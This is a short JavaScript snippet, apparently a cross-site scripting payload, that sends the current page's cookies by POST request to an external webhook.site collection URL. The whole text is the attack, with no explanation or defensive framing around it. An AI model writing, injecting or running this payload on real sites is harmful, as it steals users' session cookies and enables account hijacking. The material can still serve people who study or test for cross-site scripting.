var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://webhook.site/b6f914e2-8063-4ae3-8861-a02b8bb97fce');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookie=' + document.cookie);